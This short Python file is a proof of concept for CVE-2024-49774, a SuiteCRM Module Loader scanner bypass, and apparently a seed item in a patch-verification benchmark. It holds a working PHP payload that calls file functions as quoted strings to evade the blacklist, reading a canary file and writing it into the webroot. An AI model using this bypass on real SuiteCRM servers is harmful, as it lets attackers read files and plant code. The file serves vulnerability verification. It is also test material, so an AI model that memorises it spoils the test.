#!/usr/bin/env python3
"""original_poc.py -- CVE-2024-49774: ModuleScanner bypass via quoted-string callable.

Seed candidate for PCBV2-0204. Platform verify.sh prints this JSON and
poc/seed_exec.py drives the REAL SuiteCRM Module Loader HTTP path.

The V0 (7.14.5) scanner only checks T_STRING tokens, so a quoted callable
'file_get_contents'(...) is not compared to the blacklist. V1 (7.15.0) also
trims T_CONSTANT_ENCAPSED_STRING and blocks this spelling.
"""
import json
import sys

CANDIDATE = {
    "probe_id": "cve-2024-49774-quoted-callable",
    "kind": "quoted",
    "module_name": "PCBOriginal",
    "marker": "pcb_marker_original.txt",
    "post_install": (
        "<?php\n"
        "$c = 'file_get_contents'('/tmp/pcb_canary.txt');\n"
        "'file_put_contents'('/var/www/html/pcb_marker_original.txt', $c);\n"
    ),
}


if __name__ == "__main__":
    if sys.argv[1:] and sys.argv[1] == "--run":
        from seed_exec import run_probe

        version = sys.argv[2] if len(sys.argv) > 2 else "v0"
        print(json.dumps(run_probe(CANDIDATE, version=version), default=str))
    else:
        print(json.dumps(CANDIDATE))
